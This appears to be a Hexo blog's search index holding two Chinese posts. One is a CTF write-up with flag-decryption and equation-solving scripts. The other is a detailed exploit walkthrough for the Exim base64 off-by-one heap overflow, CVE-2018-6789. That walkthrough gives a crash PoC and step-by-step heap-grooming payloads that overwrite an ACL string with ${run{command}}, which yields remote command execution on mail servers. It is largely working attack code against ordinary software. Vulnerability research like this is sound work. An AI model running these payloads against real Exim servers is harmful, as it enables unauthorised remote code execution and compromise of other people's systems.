<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Exim off-by-one 漏洞利用]]></title>
    <url>%2F2018%2F05%2F12%2FExim-off-by-one-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。 基于Meh的思路在特定环境下复现了漏洞利用的过程，最终达成远程命令执行，相关的漏洞环境和验证代码 （https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。 1. 漏洞成因漏洞的成因是b64decode函数在对不规范的base64编码过的数据进行解码时可能会溢出堆上的一个字节，比较经典的off-by-one漏洞。 存在漏洞的b64decode函数部分代码如下： 1234567891011b64decode(const uschar *code, uschar **ptr)&#123;int x, y;uschar *result = store_get(3*(Ustrlen(code)/4) + 1);*ptr = result;/* Each cycle of the loop handles a quantum of 4 input bytes. For the lastquantum this may decode to 1, 2, or 3 output bytes. */ ......&#125; 这段代码解码base64的逻辑是把4个字节当做一组，4个字节解码成3个字节，但是当最后余3个字节（即len(code)=4n+3）时，会解码成2个字节，解码后的总长度为 3n+2 字节，而分配的堆空间的大小为3n+1 ，因此就会发生堆溢出。当然，官方给出的修补方案也很简单，多分配几个字节就可以了。 2. 环境搭建Meh博客中漏洞测试的exim版本是直接通过apt安装的，但是由于debian官方已经修复了仓库中exim的漏洞，可以通过查看软件包源码的patch信息确认： 123456root@skysider:~/poc/exim4-4.86.2# apt-get source exim4......dpkg-source: info: applying 93_CVE-2017-1000368.patchdpkg-source: info: applying fix_smtp_banner.patchdpkg-source: info: applying CVE-2016-9963.patchdpkg-source: info: applying CVE-2018-6789.patch 我们选择下载早期版本的源代码进行编译安装： 12sudo apt-get build-dep exim4wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz 在编译过程中要安装一些依赖库，还需要修改Makefile、新建用户、配置日志文件的权限等，可以参考Dockerfile（https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。 exim可以在运行时指定配置文件，为了触发漏洞以及命令执行，需要配置CRAM-MD5 authenticator以及设置acl_smtp_mail等，配置文件如下： 123456789101112131415161718192021acl_smtp_mail=acl_check_mailacl_smtp_data=acl_check_databegin aclacl_check_mail: .ifdef CHECK_MAIL_HELO_ISSUED deny message = no HELO given before MAIL command condition = $&#123;if def:sender_helo_name &#123;no&#125;&#123;yes&#125;&#125; .endif acceptacl_check_data: acceptbegin authenticatorsfixed_cram: driver = cram_md5 public_name = CRAM-MD5 server_secret = $&#123;if eq&#123;$auth1&#125;&#123;ph10&#125;&#123;secret&#125;fail&#125; server_set_id = $auth1 以调试模式启动exim服务： 1exim -bd -d-receive -C conf.conf 也可以直接使用docker来验证该漏洞（上面的命令为默认启动命令）： 1docker run -it --name exim -p 25:25 skysider/vulndocker:cve-2018-6789 3. 漏洞测试我们使用一个简单的poc来触发漏洞，poc代码如下： 12345678910111213141516171819202122#!/usr/bin/python# -*- coding: utf-8 -*-import smtplibfrom base64 import b64encodeprint &quot;this poc is tested in exim 4.89 x64 bit with cram-md5 authenticators&quot;ip_address = raw_input(&quot;input ip address: &quot;)s = smtplib.SMTP(ip_address)#s.set_debuglevel(1)# 1. put a huge chunk into unsorted bins.ehlo(&quot;mmmm&quot;+&quot;b&quot;*0x1500) # 0x2020# 2. send base64 data and trigger off-by-one#raw_input(&quot;overwrite one byte of next chunk&quot;)s.docmd(&quot;AUTH CRAM-MD5&quot;)payload = &quot;d&quot;*(0x2008-1)try: s.docmd(b64encode(payload)+b64encode(&apos;\xf1\xf1&apos;)[:-1]) s.quit()except smtplib.SMTPServerDisconnected: print &quot;[!] exim server seems to be vulnerable to CVE-2018-6789.&quot; 当执行这段代码时，会触发内存错误 在这个过程中，堆的主要变化如下： 我们可以去观察错误之前的堆，attach到子进程，下图是发送ehlo消息之后的堆： 发送Auth数据之后，我们可以看一下执行完b64decode函数之后的堆： 图中圈出来的两个字节正是我们发送的Auth数据解码出来的最后两个字节，最后一个字节0xf1修改了下一个块的大小，使得原本应该是0x4040（0x6060-0x2020）的unsorted 空闲块变成了0x40f0，通过查看该空闲块紧邻的下一个堆块可以确认当前unsorted bin的空闲块大小是被修改了，因此当从该空闲块分配空间时，malloc函数会检查该空闲块的大小 0x40f0 (低字节的低3位是标志位）与紧邻的下一个堆块标记的前一个堆块的大小 0x4040 是否相等，若不相等，就会触发内存错误。 4. Exim内存管理机制exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了store pool、store block的概念。store pool是一个单链表结构，每一个节点都是一个store block，每个store block的数据大小至少为0x2000，storeblock的结构如下： 123456/* Structure describing the beginning of each big block. */typedef struct storeblock &#123; struct storeblock *next; size_t length;&#125; storeblock; 下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。更多关于exim内存管理机制可以查看store.c。 5. 漏洞利用整体的漏洞利用思路参考漏洞发现者Meh的博客，通过覆盖acl字符串为 ${run{command}} 的方式，达到远程命令执行的目的。因为不同的配置和启动参数可能会导致exim服务在启动运行过程中堆栈布局存在差异，因此漏洞利用脚本仅在给定的环境中测试生效。 下面是漏洞利用的详细步骤： 发送ehlo，布局堆空间 12ehlo(s, "a"*0x1000) # 0x2020ehlo(s, "a"*0x20) 形成一块大小为0x7040的空闲堆块 发送unknown command（包含不可打印字符）从unsorted bin分配内存空间 1docmd(s, "\xee"*0x700) 发送的unknown command 的大小要满足 yield_length &lt; (length + nonprintcount * 3 + 1) ，从而使得发送的unknown command能够调用malloc函数分配一个新的storeblock。 发送ehlo信息回收unknown命令分配的空间 1ehlo(s, "c"*0x2c00) 在回收unknown command占用的内存空间时，由于之前的sender_host_name占用的内存空间已经释放，会发生合并，形成大小为0x2050的空闲块 发送Auth数据，触发漏洞，修改ehlo信息所在堆块的大小 12payload = "d"*(0x2020+0x30-0x18-1)docmd(s, b64encode(payload)+b64encode("\xf1\xf1")[:-1]) 发送Auth数据伪造下一个块的块头信息，绕过释放sender_host_name所在堆块时的内存检查 12payload2 = 'm'*0x70+p64(0x1f41) # modify fake sizedocmd(s, b64encode(payload2)) 释放sender_host_name所在堆块，同时为了不释放其他storeblock，发送包含无效字符的信息 1ehlo(s, "skysider+") 发送Auth数据，修改overlapped所在storeblock的next指针，令其指向acl字符串所在的storeblock 123payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + p8(0x80)try_addr = p16(try_addr*0x10+4) # to changedocmd(s, b64encode(payload3)+b64encode(try_addr)[:-1]) 由于地址随机化，acl所在的storeblock高位字节未知（在docker环境下，低12bit为0x480不变），但是原始的next指针指向的storeblock与要修改的storeblock高位字节相同，仅低位3字节不同，因此可以采用局部overwrite，只需要爆破12bit即可。 发送ehlo消息释放所有的storeblock 1ehlo(s, &quot;released&quot;) 此时unsorted bin表中存在多个空闲块，如下图所示，其中框出来的空闲块就是包含acl的storeblock 覆盖acl字符串 12345payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)payload4 += 't'*(0x1f80-len(payload4))auth(s, b64encode(payload4)+'ee')payload5 = "a"*0x78 + "$&#123;run&#123;" + command + "&#125;&#125;\x00"auth(s, b64encode(payload5)+"ee") 发送第一个auth消息之后，unsorted bin表如下图所示 接着再分配合适的空间时，就可以获取目标storeblock所在的堆块，覆盖其中的acl字符串 触发acl检查 1s.sendline(&quot;MAIL FROM: &lt;test@163.com&gt;&quot;) 至此就可以远程执行命令，完整的漏洞利用脚本见exp.py （https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下： 注：该漏洞利用脚本仅用于交流学习与安全研究，请勿用于非法用途。 参考： https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/ https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>cve-2018-6789</tag>
        <tag>off-by-one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红帽杯2018]]></title>
    <url>%2F2018%2F05%2F11%2F2018redhat%2F</url>
    <content type="text"><![CDATA[熬了一天，感觉pwn和re的水平退步不少。 PWN这次比赛中的pwn的题目难度一般，3个pwn分别涉及到 栈溢出 ——game server null byte offset-by-one —— shellcode manager 格式化串漏洞 —— Starcraft RPG 中间在漏洞利用过程中也踩到了一些坑（可能是长期没打没有手感，有时间会整理一下）。 REre只看了最简单的icm，感觉自己re方面真是非常菜，赛后重新整理了getFlag的脚本，进行了简化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env python''' pip install cryptography'''from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.backends import default_backenddef getCipherAlgorithm(key, mode): backend = default_backend() cipher = Cipher(algorithms.IDEA(key), mode, backend=backend) return cipherdef encrypt(plainMsg, key, mode): cipher = getCipherAlgorithm(key, mode) encryptor = cipher.encryptor() res = encryptor.update(plainMsg) + encryptor.finalize() return resdef decrypt(cipherMsg, key, mode): cipher = getCipherAlgorithm(key, mode) decryptor = cipher.decryptor() res = decryptor.update(cipherMsg) + decryptor.finalize() return resdef getKey(): from ctypes import * res = [] buf = "" libc = cdll.LoadLibrary("libc.so.6") libc.srand(0x78C819C3) for i in range(16): buf += "&#123;:02x&#125;".format(libc.rand() % 256).decode('hex') return bufdef getCipherText(): secret = [ 0xd0, 0xe0, 0xab, 0x9c, 0xcd, 0x78, 0x5b, 0x54, 0x3d, 0xe4, 0xea, 0x33, 0x51, 0x44, 0x6d, 0x3c, 0x4e, 0xce, 0xdf, 0xb5, 0x41, 0x0, 0x1c, 0xec, 0xe3, 0x1b, 0xc3, 0x8c, 0x91, 0x25, 0x7f, 0x1b, 0x60, 0xfe, 0x35, 0x9c, 0xea, 0x4, 0x4c, 0x87, 0x8d, 0x97, 0x93, 0x5c, 0xb8, 0x9a, 0x70, 0x75, ] buf = "" for i in range(len(secret)): secret[i] = (119-i) ^ secret[i] for i in range(len(secret)): secret[i] = secret[i] ^ (8 - i%8) buf += "&#123;:02x&#125;".format(secret[i]).decode('hex') return bufdef getFlag(): cipherText = getCipherText() key = getKey() mode = modes.ECB() msg = decrypt(cipherText, key, mode) print msgif __name__ == '__main__': getFlag() wcm解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940'''SM4 from https://github.com/yixiangzhike/AlgorithmSM'''from SM4 import *from ctypes import *def getKey(): key = "" libc = cdll.msvcrt libc.srand(0x2872DD1B) for i in range(16): key += "&#123;:02x&#125;".format(libc.rand() % 256) return key.decode('hex')def getCipherText(): secret = [ 0xf4, 0x88, 0x91, 0xc2, 0x9b, 0x20, 0x5b, 0x3, 0xf1, 0xed, 0xf6, 0x13, 0x46, 0x3c, 0x55, 0x81, 0x61, 0xf, 0xff, 0x14, 0x6e, 0x1c, 0x48, 0x28, 0x79, 0x9f, 0x85, 0xaf, 0xc5, 0x58, 0xd, 0xd6, 0xa5, 0xd9, 0x64, 0xfd, 0x46, 0x9, 0x8c, 0xdf, 0x3b, 0xa5, 0x37, 0x62, 0x5a, 0xa6, 0xd2, 0x4b, ] v9 = 51 cipherText = "" while v9 - 51 &lt; 48: cipherText += "&#123;:02x&#125;".format(secret[v9-51] ^ v9) v9 += 1 return cipherText.decode('hex')key = getKey().encode('hex')print "key is &#123;&#125;".format(key)cipherText = getCipherText().encode('hex')print "cipherText is &#123;&#125;".format(cipherText)sm4 = SM4(key=key)msg = sm4.sm4_decrypt(cipherText, SM4_ECB)print msg.decode('hex') Crypto3dlight，当时就考虑用解多元一次方程组的方法来求解，当时搞不动了，后来抽空写了下生成系数矩阵的脚本，迎刃而解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import numpy as npimport osdef str2arr(str): return [[[(ord(str[i * 8 + j]) &gt;&gt; k &amp; 1) for k in xrange(8)] for j in xrange(8)] for i in xrange(8)]def str2arr_rev(arr): ret = "" for i in xrange(8): for j in xrange(8): ret += chr(int(''.join(map(str, arr[i][j][::-1])), 2)) return retdef arr2str(arr): ret = '' for i in xrange(8): for j in xrange(8): for k in xrange(8): ret += chr(arr[i][j][k]) return retdef arr2str_rev(str2): ret = [[[0 for k in xrange(8)] for j in xrange(8)] for i in xrange(8)] for i in xrange(8): for j in xrange(8): for k in xrange(8): ret[i][j][k] = ord(str2[i*64+j*8+k]) return retdef check(x, y, z): if x &lt; 0 or x &gt; 7 or y &lt; 0 or y &gt; 7 or z &lt; 0 or z &gt; 7: return False return Truedef light(arr, i, j, k, x, y, z, power): # square if check(i + x, j + y, k + z): arr[i + x][j + y][k + z] += power # top right if x != 0 and check(i - x, j + y, k + z): arr[i - x][j + y][k + z] += power # if y != 0 and check(i + x, j - y, k + z): arr[i + x][j - y][k + z] += power if z != 0 and check(i + x, j + y, k - z): arr[i + x][j + y][k - z] += power if x != 0 and y != 0 and check(i - x, j - y, k + z): arr[i - x][j - y][k + z] += power if x != 0 and z != 0 and check(i - x, j + y, k - z): arr[i - x][j + y][k - z] += power if y != 0 and z != 0 and check(i + x, j - y, k - z): arr[i + x][j - y][k - z] += power if x != 0 and y != 0 and z != 0 and check(i - x, j - y, k - z): arr[i - x][j - y][k - z] += powerdef encrypt(flag, power): ret = [[[0 for _ in xrange(8)] for _ in xrange(8)] for _ in xrange(8)] lights = str2arr(flag) for i in range(8): for j in range(8): for k in range(8): if lights[i][j][k] == 1: # bit is 1 for x in range(power): for y in range(power - x): for z in range(power - x - y): light(ret, i, j, k, x, y, z, power - x - y - z) return arr2str(ret)def getMatrix(): A = [[ 0 for i in range(8**3)] for j in range(8**3)] for row in range(len(A)): ord_x = row / 8**2 ord_y = (row - ord_x*(8**2))/8 ord_z = row % 8 A[row][ord_x * 8**2 + ord_y * 8 + ord_z] = 2 if ord_x &gt; 0: A[row][(ord_x-1)* 8**2 + ord_y*8 + ord_z] = 1 if ord_x &lt; 7: A[row][(ord_x+1)* 8**2 + ord_y*8 + ord_z] = 1 if ord_y &gt; 0: A[row][ord_x* 8**2 + (ord_y-1) *8 + ord_z] = 1 if ord_y &lt; 7: A[row][ord_x* 8**2 + (ord_y+1) *8 + ord_z] = 1 if ord_z &gt; 0: A[row][ord_x * 8**2 + ord_y * 8 + ord_z -1 ] = 1 if ord_z &lt; 7: A[row][ord_x * 8**2 + ord_y * 8 + ord_z + 1] = 1 return np.array(A)def getCipher(): flag = "flag&#123;abcdefg_hij_klm_nop_qrst_uvwxyz_0123456789_1234567890__xyz&#125;" shuffle_flag = ''.join(flag[0::2][i] + flag[-1::-2][i] for i in xrange(32)) cipher = encrypt(shuffle_flag, 2) CipherArr =arr2str_rev(cipher) return np.array(CipherArr).flatten()def decrypt(): solvea = np.linalg.solve(getMatrix(), getCipher()) t = [] for a in solvea: if abs(a) &lt; 0.0001: t.append(0) else: t.append(1) flag = "" for i in range(0, len(t), 8): flag += chr(int(''.join(map(str, t[i:i+8]))[::-1], 2)) return ''.join(flag[0::2][i] + flag[-1::-2][i] for i in xrange(32))print decrypt() 版权声明： 除非注明，本博文章均为原创，转载请以链接形式标明本文地址。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>redhat</tag>
        <tag>pwn</tag>
        <tag>reverse</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
</search>
